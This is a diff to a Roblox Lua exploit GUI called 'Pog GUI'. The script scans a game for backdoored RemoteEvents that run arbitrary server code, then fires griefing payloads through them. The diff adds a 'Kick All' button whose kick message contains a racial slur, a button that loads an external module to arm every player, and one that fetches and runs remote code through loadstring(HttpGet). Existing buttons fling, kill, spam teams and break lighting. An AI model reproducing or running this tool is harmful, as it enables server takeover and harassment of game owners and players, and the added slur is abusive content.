@@ -97,12 +97,15 @@ local BTN5 = Instance.new("TextButton")
 local BTN6 = Instance.new("TextButton")
 local BTN7 = Instance.new("TextButton")
 local BTN8 = Instance.new("TextButton")
+local BTN70 = Instance.new("TextButton")
 local BTN13 = Instance.new("TextButton")
 local BTN15 = Instance.new("TextButton")
 local BTN17 = Instance.new("TextButton")
 local BTN18 = Instance.new("TextButton")
 local BTN16 = Instance.new("TextButton")
 local BTN14 = Instance.new("TextButton")
+local BTN71 = Instance.new("TextButton")
+local BTN72 = Instance.new("TextButton")
 local BTN69 = Instance.new("TextButton")
 local BTN11 = Instance.new("TextButton")
 local TextLabel2 = Instance.new("TextLabel")
@@ -118,21 +121,22 @@ local foundEvent = false
 local FinishedFound = false
 
 local function testRemote(remote)
-    local modelName = "Pog"
+    local modelName = "PogG"
     print("Checking RemoteEvent:", remote:GetFullName())
     local function onAdded(instance)
-        if instance:IsA("Model") and instance.Name == modelName then
+         if instance:IsDescendantOf(workspace) and instance.Name == modelName then
             foundEvent = true
-        end
+         end
     end
+
     local connection = workspace.ChildAdded:Connect(onAdded)
     remote:FireServer([[ 
-        local model = Instance.new("Model") 
-        model.Name = "Pog" 
-        model.Parent = game.Workspace 
+        local model = Instance.new("Message") 
+        model.Name = "PogG"
+        model.Parent = workspace 
     ]])
     local startTime = tick()
-    while tick() - startTime < 0.001 do
+    while tick() - startTime < 0.5 do
         if foundEvent then break end
         RunService.Heartbeat:Wait()
     end
@@ -144,7 +148,7 @@ end
 local remoteEvent
 local remotes = {}
 for _, remote in ipairs(game:GetDescendants()) do
-    if remote:IsA("RemoteEvent") and remote.Name ~= "UpdateCurrentCall" then
+    if remote:IsA("RemoteEvent") and remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then
         table.insert(remotes, remote)
     end
 end
@@ -160,7 +164,7 @@ local function findRemote()
         end
         local remote = remotes[index]
         index += 1
-        if remote.Name ~= "UpdateCurrentCall" then 
+        if remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then 
             if testRemote(remote) then
                 remoteEvent = remote
                 print("✅ Using RemoteEvent:", remote:GetFullName())
@@ -168,18 +172,11 @@ local function findRemote()
             end
         end
     end
-    task.wait(0.001)
+    task.wait(0.05)
     findRemote()
 end
 
-local remote = game.ReplicatedStorage:FindFirstChild("RemoteEvent") or workspace:FindFirstChild("RemoteEvent")
-if remote and testRemote(remote) then
-    remoteEvent = remote
-    print("Using RemoteEvent:", remote:GetFullName())
-else
-    print("Starting scan for RemoteEvents...")
-    task.spawn(findRemote)
-end
+task.spawn(findRemote)
 
 local function fireRemoteEvent(code)
     if remoteEvent then
@@ -269,8 +266,17 @@ end
 local function showHint()
     fireRemoteEvent([[
         local hint = Instance.new("Hint", workspace)
+		 local function randomString(length)
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"
+    local result = {}
+    for i = 1, length do
+        local randIndex = math.random(1, #chars)
+        result[i] = chars:sub(randIndex, randIndex)
+    end
+    return table.concat(result)
+end
         while true do
-            hint.Text = tostring(math.random(0, 99999999))
+            hint.Text = randomString(200)
             task.wait(0.2)
         end
     ]])
@@ -336,16 +342,25 @@ end
 
 local function spamTeams()
     fireRemoteEvent([[
-        while true do
-            local team = Instance.new("Team", game:GetService("Teams"))
-            team.Name = tostring(math.random(0, 99999999))
+
+		for i = 1, 50 do
+		    local function randomString(length)
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"
+    local result = {}
+    for i = 1, length do
+        local randIndex = math.random(1, #chars)
+        result[i] = chars:sub(randIndex, randIndex)
+    end
+    return table.concat(result)
+end
+			        local team = Instance.new("Team", game:GetService("Teams"))
+            team.Name = randomString(50)
             team.TeamColor = BrickColor.random()
             team.AutoAssignable = true
             for _, player in pairs(game.Players:GetPlayers()) do
                 player.Team = team
             end
-            task.wait(0.1)
-        end
+		end
     ]])
 end
 
@@ -368,6 +383,24 @@ BTN7.MouseButton1Click:Connect(function()
     ]])
 end)
 BTN8.MouseButton1Click:Connect(unanchorRandomParts)
+BTN70.MouseButton1Click:Connect(function()
+    fireRemoteEvent([[
+        for _, player in pairs(game.Players:GetPlayers()) do
+            player:Kick("Restarting Niggas")
+        end
+    ]])
+end)
+BTN72.MouseButton1Click:Connect(function()
+    fireRemoteEvent([[
+
+		for _, player in pairs(game.Players:GetPlayers()) do
+            require(129414474541336).accgun(player.Name)
+        end
+    ]])
+end)
+BTN71.MouseButton1Click:Connect(function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/vulnerability.lua"))()
+end)
 BTN13.MouseButton1Click:Connect(function()
     fireRemoteEvent([[
         for _, player in pairs(game.Players:GetPlayers()) do
@@ -378,6 +411,25 @@ BTN13.MouseButton1Click:Connect(function()
         end
     ]])
 end)
+-- Helper function to style buttons uniformly
+local function styleButton(btn)
+    btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    btn.BackgroundTransparency = 0.5
+    btn.BorderSizePixel = 0
+    btn.Size = UDim2.new(0, 250, 0, 50)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextScaled = true
+    btn.TextStrokeTransparency = 0
+    btn.TextWrapped = true
+	local btnC = Instance.new("UICorner")
+	btnC.Parent = btn
+
+    local btnUIStroke = Instance.new("UIStroke")
+    btnUIStroke.Color = Color3.fromRGB(32,32,32)
+    btnUIStroke.Thickness = 2
+	btnUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    btnUIStroke.Parent = btn
+end
 BTN14.MouseButton1Click:Connect(spamTeams)
 BTN15.MouseButton1Click:Connect(function()
     fireRemoteEvent([[
@@ -507,7 +559,7 @@ TextLabel.BackgroundTransparency = 1
 TextLabel.Size = UDim2.new(1, 0, 0, 50)
 TextLabel.Text = "Pog GUI v1.1"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextSize = 20
+TextLabel.TextSize = 25
 TextLabel.TextStrokeTransparency = 0
 TextLabel.TextWrapped = true
 
@@ -565,34 +617,124 @@ closeButtonStroke.Parent = CloseButton
 CloseButton.MouseButton1Click:Connect(function()
     Replc:Destroy()
 end)
--- Helper function to style buttons uniformly
-local function styleButton(btn)
-    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    btn.BackgroundTransparency = 0.5
-    btn.BorderSizePixel = 0
-    btn.Size = UDim2.new(0, 250, 0, 50)
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.TextScaled = true
-    btn.TextStrokeTransparency = 0
-    btn.TextWrapped = true
-	local btnC = Instance.new("UICorner")
-	btnC.Parent = btn
-	local UIGradientb = Instance.new("UIGradient")
-	UIGradientb.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 255, 0)),  -- Neon Green-Blue  
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))  -- Vibrant Pink  
-})
+local function createPog()
+   game.StarterGui:SetCore("SendNotification",{
+		Title = "Pog GUI",
+		Text = "Backdoor found! Time to have fun.."
+	})
+TextLabel0.Text = "-| Destruction |-"
+TextLabel0.TextColor3 = Color3.fromRGB(255, 50, 50)
+	styleButton(BTN1)
+BTN1.Text = "Infect map w/ ReplicateClientation"
+BTN1.Parent = ScrollingFrame
 
+styleButton(BTN2)
+BTN2.Text = "Break Lighting"
+BTN2.Parent = ScrollingFrame
 
-    UIGradientb.Parent = btn
-    UIGradientb.Transparency = NumberSequence.new(0) -- Fully opaque gradient
+styleButton(BTN3)
+BTN3.Text = "Music"
+BTN3.Parent = ScrollingFrame
 
+styleButton(BTN4)
+BTN4.Text = "Spawn GUI"
+BTN4.Parent = ScrollingFrame
 
-    local btnUIStroke = Instance.new("UIStroke")
-    btnUIStroke.Color = Color3.fromRGB(32,32,32)
-    btnUIStroke.Thickness = 2
-	btnUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    btnUIStroke.Parent = btn
+styleButton(BTN5)
+BTN5.Text = "Spawn Message"
+BTN5.Parent = ScrollingFrame
+
+styleButton(BTN6)
+BTN6.Text = "Spawn Spheres"
+BTN6.Parent = ScrollingFrame
+
+styleButton(BTN7)
+BTN7.Text = "Set ReplicateClientation Sky"
+BTN7.Parent = ScrollingFrame
+
+styleButton(BTN8)
+BTN8.Text = "Start Unanchoring Parts"
+BTN8.Parent = ScrollingFrame
+
+styleButton(BTN70)
+BTN70.Text = "Kick All"
+BTN70.Parent = ScrollingFrame
+
+styleButton(BTN69)
+BTN69.Text = "Car Drift"
+BTN69.Parent = ScrollingFrame
+
+styleButton(BTN71)
+BTN71.Text = "Modified LALOL"
+BTN71.Parent = ScrollingFrame
+
+styleButton(BTN72)
+BTN72.Text = "Give Everyone Acc Gun"
+BTN72.Parent = ScrollingFrame
+
+styleButton(BTN15)
+BTN15.Text = "TP To realm (probably wont work)"
+BTN15.Parent = ScrollingFrame
+
+styleButton(BTN16)
+BTN16.Text = "1x1x1x1 reference (kill all)"
+BTN16.Parent = ScrollingFrame
+
+styleButton(BTN17)
+BTN17.Text = "Say in chat ReplicateClientation fixed this game 👍"
+BTN17.Parent = ScrollingFrame
+styleButton(BTN18)
+BTN18.Text = "Fling everyone"
+BTN18.Parent = ScrollingFrame
+styleButton(BTN13)
+BTN13.Text = "Give powers"
+BTN13.Parent = ScrollingFrame
+
+styleButton(BTN14)
+BTN14.Text = "Shit with teams"
+BTN14.Parent = ScrollingFrame
+
+styleButton(BTN11)
+BTN11.Text = "Set Tour Sky"
+BTN11.Parent = ScrollingFrame
+
+TextLabel2.Parent = ScrollingFrame
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.Size = UDim2.new(1, 0, 0, 50)
+TextLabel2.Text = "-| Restore |-"
+TextLabel2.TextColor3 = Color3.fromRGB(200, 200, 200)
+TextLabel2.TextScaled = true
+TextLabel2.TextStrokeTransparency = 0
+TextLabel2.TextWrapped = true
+
+styleButton(BTN9)
+BTN9.Text = "Clear Messages"
+BTN9.Parent = ScrollingFrame
+
+styleButton(BTN10)
+BTN10.Text = "Clear Color Corrections"
+BTN10.Parent = ScrollingFrame
+
+styleButton(BTN12)
+BTN12.Text = "Clear everything"
+BTN12.Parent = ScrollingFrame
+TextLabel3.Parent = ScrollingFrame
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.Size = UDim2.new(1, 0, 0, 50)
+TextLabel3.Text = "-| Updatelog |-"
+TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel3.TextScaled = true
+TextLabel3.TextStrokeTransparency = 0
+TextLabel3.TextWrapped = true
+
+TextLabel4.Parent = ScrollingFrame
+TextLabel4.BackgroundTransparency = 1
+TextLabel4.Size = UDim2.new(1, 0, 0, 50)
+TextLabel4.Text = "fixed kicking because of remote event called UpdateCurrentCall, the ui is now draggable in the time of checking, fixed some glitches, changed font, made SUPER FAST SCANNING!"
+TextLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel4.TextScaled = true
+TextLabel4.TextStrokeTransparency = 0
+TextLabel4.TextWrapped = true
 end
 styleButton(ToggleButton)
 ToggleButton.Parent = Replc
@@ -681,113 +823,7 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
         update2(input)
     end
 end)
-local function createPog()
-   game.StarterGui:SetCore("SendNotification",{
-		Title = "Pog GUI",
-		Text = "Backdoor found! Time to have fun.."
-	})
-TextLabel0.Text = "-| Destruction |-"
-TextLabel0.TextColor3 = Color3.fromRGB(255, 50, 50)
-	styleButton(BTN1)
-BTN1.Text = "Infect map w/ ReplicateClientation"
-BTN1.Parent = ScrollingFrame
 
-styleButton(BTN2)
-BTN2.Text = "Break Lighting"
-BTN2.Parent = ScrollingFrame
-
-styleButton(BTN3)
-BTN3.Text = "Music"
-BTN3.Parent = ScrollingFrame
-
-styleButton(BTN4)
-BTN4.Text = "Spawn GUI"
-BTN4.Parent = ScrollingFrame
-
-styleButton(BTN5)
-BTN5.Text = "Spawn Message"
-BTN5.Parent = ScrollingFrame
-
-styleButton(BTN6)
-BTN6.Text = "Spawn Spheres"
-BTN6.Parent = ScrollingFrame
-
-styleButton(BTN7)
-BTN7.Text = "Set ReplicateClientation Sky"
-BTN7.Parent = ScrollingFrame
-
-styleButton(BTN8)
-BTN8.Text = "Start Unanchoring Parts"
-BTN8.Parent = ScrollingFrame
-
-styleButton(BTN69)
-BTN69.Text = "Car Drift"
-BTN69.Parent = ScrollingFrame
-
-styleButton(BTN15)
-BTN15.Text = "TP To realm (probably wont work)"
-BTN15.Parent = ScrollingFrame
-
-styleButton(BTN16)
-BTN16.Text = "1x1x1x1 reference (kill all)"
-BTN16.Parent = ScrollingFrame
-
-styleButton(BTN17)
-BTN17.Text = "Say in chat ReplicateClientation fixed this game 👍"
-BTN17.Parent = ScrollingFrame
-styleButton(BTN18)
-BTN18.Text = "Fling everyone"
-BTN18.Parent = ScrollingFrame
-styleButton(BTN13)
-BTN13.Text = "Give powers"
-BTN13.Parent = ScrollingFrame
-
-styleButton(BTN14)
-BTN14.Text = "Spam Teams"
-BTN14.Parent = ScrollingFrame
-
-styleButton(BTN11)
-BTN11.Text = "Set Tour Sky"
-BTN11.Parent = ScrollingFrame
-
-TextLabel2.Parent = ScrollingFrame
-TextLabel2.BackgroundTransparency = 1
-TextLabel2.Size = UDim2.new(1, 0, 0, 50)
-TextLabel2.Text = "-| Restore |-"
-TextLabel2.TextColor3 = Color3.fromRGB(200, 200, 200)
-TextLabel2.TextScaled = true
-TextLabel2.TextStrokeTransparency = 0
-TextLabel2.TextWrapped = true
-
-styleButton(BTN9)
-BTN9.Text = "Clear Messages"
-BTN9.Parent = ScrollingFrame
-
-styleButton(BTN10)
-BTN10.Text = "Clear Color Corrections"
-BTN10.Parent = ScrollingFrame
-
-styleButton(BTN12)
-BTN12.Text = "Clear everything"
-BTN12.Parent = ScrollingFrame
-TextLabel3.Parent = ScrollingFrame
-TextLabel3.BackgroundTransparency = 1
-TextLabel3.Size = UDim2.new(1, 0, 0, 50)
-TextLabel3.Text = "-| Updatelog |-"
-TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel3.TextScaled = true
-TextLabel3.TextStrokeTransparency = 0
-TextLabel3.TextWrapped = true
-
-TextLabel4.Parent = ScrollingFrame
-TextLabel4.BackgroundTransparency = 1
-TextLabel4.Size = UDim2.new(1, 0, 0, 50)
-TextLabel4.Text = "fixed kicking because of remote event called UpdateCurrentCall, the ui is now draggable in the time of checking, fixed some glitches, changed font, made SUPER FAST SCANNING!"
-TextLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel4.TextScaled = true
-TextLabel4.TextStrokeTransparency = 0
-TextLabel4.TextWrapped = true
-end
 repeat task.wait() until FinishedFound or remoteEvent
 if not remoteEvent then
     TextLabel0.Text = "backdoor not found!!"
@@ -797,5 +833,4 @@ if not remoteEvent then
 else
     createPog()
 end
-
 
